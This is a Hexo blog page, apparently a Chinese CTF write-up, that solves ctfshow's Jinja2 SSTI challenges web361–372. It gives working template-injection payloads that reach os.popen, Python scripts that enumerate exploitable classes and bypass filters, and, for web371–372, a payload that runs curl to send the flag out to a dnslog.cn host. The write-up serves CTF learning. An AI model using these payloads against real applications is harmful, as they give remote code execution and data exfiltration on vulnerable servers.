@@ -1,0 +1,555 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || CTFSHOW-SSTI-WP</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>CTFSHOW-SSTI-WP </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/9/22
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/SSTI" style=color:#879cff>
+                    SSTI
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><blockquote>
+<ul>
+<li><p>第一个ssti，还是很友好滴，啥也没过滤</p>
+</li>
+<li><p>拥有一个很好用的hackbar还是挺幸福的，直接用hackrbar自带的ssti语句都可以</p>
+</li>
+<li><p>get传参：<code>&#123;&#123;url_for.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()&#125;&#125;</code></p>
+</li>
+<li><p>做法还是很多的，这里再写一个常规一点的：</p>
+<ul>
+<li><p>先是通过<code>__class__</code>获取当前类，通过<code>__base__</code>获取基类</p>
+</li>
+<li><p>获取基类的子类：<code>__subclasses__()</code>，脚本遍历寻找可利用类：</p>
+<pre><code class="python">import requests
+import tqdm
+
+url = &#39;http://5570d9a9-3005-4e3d-8058-ddc93807a27b.challenge.ctf.show/&#39;
+for i in tqdm.tqdm(range(200)):
+    r = requests.get(url=url+&#39;?name=&#123;&#123;"".__class__.__bases__[0].__subclasses__()['+str(i)+']&#125;&#125;&#39;)
+    if &quot;os._wrap_close&quot; in r.text:
+        print(i)
+# 输出132
+</code></pre>
+</li>
+<li><p>payload：<code>?name=&#123;&#123;"".__class__.__bases__[0]. __subclasses__()[132].__init__.__globals__['popen']('ls').read()&#125;&#125;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><blockquote>
+<ul>
+<li>payload：<code>?name=&#123;&#123;url_for.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()&#125;&#125;</code></li>
+<li>所以过滤了啥</li>
+<li>看了大佬的wp说是过滤了数字，可以换成全角数字绕过</li>
+<li>payload：<code>?name=&#123;&#123;"".__class__.__bases__[０].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></li>
+</ul>
+</blockquote>
+<h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><blockquote>
+<ul>
+<li><p>过滤了单双引号</p>
+</li>
+<li><p>get传参绕过：</p>
+<ul>
+<li>payload：<code>?name=&#123;&#123;url_for.__globals__.__builtins__[request.args.a](request.args.b).popen(request.args.c).read()&#125;&#125;&amp;a=__import__&amp;b=os&amp;c=cat /flag</code></li>
+<li>或者：<code>?name=&#123;&#123;lipsum.__globals__.os.popen(request.args.a).read()&#125;&#125;&amp;a=cat /flag</code></li>
+</ul>
+</li>
+<li><p>字符串拼接绕过：</p>
+<ul>
+<li>先传入<code>?name=&#123;&#123;config&#125;&#125;</code>，寻找可利用字符</li>
+<li>如：<code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;</code> 等于 <code>?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</code></li>
+<li>可以写脚本遍历输出想要的字符的下标然后用<code>%2b</code>进行拼接</li>
+</ul>
+</li>
+<li><p>通过chr拼接：</p>
+<ul>
+<li><p>先找出 chr 函数，通过 chr 拼接</p>
+<pre><code class="python">?name=&#123;% set chr=url_for.__globals__.__builtins__.chr %&#125;&#123;% print  url_for.__globals__[chr(111)%2bchr(115)]%&#125;
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><blockquote>
+<ul>
+<li>过滤了引号和<code>args</code>，所以上一个题后两个方法依然可用，第一种可以把<code>args</code>换成<code>values</code>或<code>cookies</code></li>
+<li>payload1：<code>?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag</code></li>
+<li>payload2：<code>?name=&#123;&#123;lipsum.__globals__.os.popen(request.cookies.a).read()&#125;&#125;</code>Cookie传参：<code>a=cat /flag</code></li>
+</ul>
+</blockquote>
+<h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><blockquote>
+<ul>
+<li><p>上一题的payload还是可以直接用，过滤了单双引号，<code>args</code>，中括号</p>
+</li>
+<li><p>使用<code>__getitem__</code> 魔术方法，把中括号转换为括号的形式<code>__bases__[0]=__bases__.__getitem__(0)</code>，通过 <code>__getitem__()</code>构造任意字符</p>
+</li>
+<li><p>payload：</p>
+<pre><code class="python">?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)
+>   ).read()&#125;&#125;
+# 即：&#123;&#123;url_for.__globals__.os.popen('cat /flag').read()&#125;&#125;
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h3><blockquote>
+<ul>
+<li>在前边的基础上又过滤了下划线</li>
+<li>可以用attr方法：<code>request|attr(request.cookies.a)</code>等价于<code>request[&#39;a&#39;]</code></li>
+<li>传参绕过：<code>?name=&#123;&#123;(lipsum|attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</code></li>
+</ul>
+</blockquote>
+<h3 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h3><blockquote>
+<ul>
+<li>过滤了<code>os</code></li>
+<li>传参绕过：<code>?name=&#123;&#123;(lipsum|attr(request.values.b)).get(request.values.c).popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__&amp;c=os</code></li>
+</ul>
+</blockquote>
+<h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><blockquote>
+<ul>
+<li><p>过滤了<code>&#123; &#123;</code>，可以使用<code>&#123; %</code>——（这里<code>&#123;</code>和<code>%</code>之间不得不加个空格，不然hexo报错）</p>
+</li>
+<li><p>payload：</p>
+<pre><code class="jinja2">?name=&#123; % print((lipsum|attr(request.values.b)).get(request.values.c).popen(request.values.a).read())% &#125;&amp;a=cat /flag&amp;b=__globals__&amp;c=os
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h3><blockquote>
+<ul>
+<li><p>ban了request，属于是不给人活路</p>
+</li>
+<li><p>用 string 过滤器得到 config 字符串：<code>config|string</code>，再转换成列表，<code>config|string|list</code></p>
+</li>
+<li><p>用列表的<code>pop</code>方法就可以成功得到某个字符了，使用<code>lower()</code>方法将字符转化为小写</p>
+</li>
+<li><p>这里抄一个脚本：</p>
+<pre><code class="python">import requests
+
+url = &quot;http://32705783-a30e-4cab-9412-ec453af58a2d.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;" \
+>         "&#125;).lower() %&#125;&#125; &quot;
+
+payload = &quot;cat /flag&quot;
+result = &quot;&quot;
+for j in payload:
+    for i in range(0, 1000):
+        r = requests.get(url=url.format(i))
+        location = r.text.find(&quot;&lt;h3&gt;&quot;)
+        word = r.text[location + 4:location + 5]
+        if word == j.lower():
+            print(&quot;(config|string|list).pop(%d).lower() == %s&quot; % (i, j))
+            result += &quot;(config|string|list).pop(%d).lower()~&quot; % i
+            break
+print(result[:len(result) - 1])
+</code></pre>
+</li>
+<li><p>字符串拼接绕过：</p>
+<pre><code class="python"># 构造a等价于下划线_
+&#123;% set a=(()|select|string|list).pop(24) %&#125;
+&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;
+&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;
+&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;
+&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;
+&#123;% set chr=a.chr %&#125;
+&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;
+# 相当于lipsum.__globals__[&#39;__builtins__&#39;].open(&#39;/flag&#39;).read()
+</code></pre>
+</li>
+<li><p>payload：</p>
+<pre><code class="jinja2">?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;
+&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;
+&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;
+&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;
+&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;
+&#123;% set chr=a.chr %&#125;
+&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h3><blockquote>
+<ul>
+<li><p>过滤了数字，可以使用<code>(dict(bb=a)|join|count)</code>绕过，有几个b就返回几个数字，然后进行字符串拼接</p>
+</li>
+<li><p>payload：</p>
+<pre><code class="jinja2">?name=&#123;% set c=(dict(e=a)|join|count)%&#125;
+&#123;% set cc=(dict(ee=a)|join|count)%&#125;
+&#123;% set ccc=(dict(eee=a)|join|count)%&#125;
+&#123;% set cccc=(dict(eeee=a)|join|count)%&#125;
+&#123;% set ccccccc=(dict(eeeeeee=a)|join|count)%&#125;
+&#123;% set cccccccc=(dict(eeeeeeee=a)|join|count)%&#125;
+&#123;% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%&#125;
+&#123;% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%&#125;
+&#123;% set coun=(cc~cccc)|int%&#125;
+&#123;% set po=dict(po=a,p=a)|join%&#125;
+&#123;% set a=(()|select|string|list)|attr(po)(coun)%&#125;
+&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;
+&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;
+&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;
+&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;
+&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;
+&#123;% set chr=x.chr%&#125;
+&#123;% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%&#125;
+&#123;%print(x.open(file).read())%&#125;
+</code></pre>
+</li>
+<li><p>或者还可以把<a target="_blank" rel="noopener" href="https://www.iamwawa.cn/quanjiaobanjiao.html">半角数字换成全角数字</a>绕过（抄一个转换为全角数字的脚本）：</p>
+<pre><code class="python">def half2full(half):
+    full = &#39;&#39;
+    for ch in half:
+        if ord(ch) in range(33, 127):
+            ch = chr(ord(ch) + 0xfee0)
+        elif ord(ch) == 32:
+            ch = chr(0x3000)
+        else:
+            pass
+        full += ch
+    return full
+while 1:
+      t = &#39;&#39;
+      s = input(&quot;输入想要转换的数字字符串：&quot;)
+      for i in s:
+          t += half2full(i)
+      print(t)
+# 全角 = 半角 + 0xfee0
+</code></pre>
+</li>
+<li><p>payload：</p>
+<pre><code class="jinja2">?name=&#123;% set a=(()|select|string|list).pop(２４) %&#125;
+  &#123;% set globals=(a,a,dict(globals=１)|join,a,a)|join %&#125;
+  &#123;% set init=(a,a,dict(init=１)|join,a,a)|join %&#125;
+  &#123;% set builtins=(a,a,dict(builtins=１)|join,a,a)|join %&#125;
+  &#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;
+  &#123;% set chr=a.chr %&#125;
+  &#123;% print a.open(chr(４７)~chr(１０２)~chr(１０８)~chr(９７)~chr(１０３)).read() %&#125;
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h3><blockquote>
+<ul>
+<li><p>过滤 print 关键字，flag 不会回显，可以用curl命令将flag带出来</p>
+</li>
+<li><p>数字范围为可见字符的 ascii 码值，所以数字还要用上一题的第一个方法进行拼接</p>
+</li>
+<li><p>使用dnslog回显</p>
+<pre><code class="jinja2">?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;
+&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|count%&#125;
+&#123;%set k=dict(eeeeeeeee=a)|join|count%&#125;
+&#123;%set l=dict(eeeeeeee=a)|join|count%&#125;
+&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;
+&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;
+&#123;%set b=(lipsum|string|list)|attr(a)(j)%&#125;
+&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;
+&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;
+&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;
+&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;
+&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;
+&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;
+&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(uwtdnm=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;
+&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;lalala&#123;%endif%&#125;
+</code></pre>
+</li>
+<li><p>感动，dnslog竟然好用了，摇了半天摇出来一个没有数字的地址</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h3><blockquote>
+<ul>
+<li><p>过滤了count</p>
+</li>
+<li><p>直接用length替换掉，dnslog刷新，payload：</p>
+<pre><code class="jinja2">?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;
+&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%&#125;
+&#123;%set k=dict(eeeeeeeee=a)|join|length%&#125;
+&#123;%set l=dict(eeeeeeee=a)|join|length%&#125;
+&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;
+&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;
+&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;
+&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;
+&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;
+&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;
+&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;
+&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;
+&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;
+&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(uwtdnm=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;
+&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;lalala&#123;%endif%&#125;
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<p><strong>大佬们的wp：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/122699710">ctfshow SSTI web361-web372 wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/112168039">CTFSHOW SSTI篇</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120493997">CTFshow刷题日记-WEB-SSTI(web361-372)</a></p>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
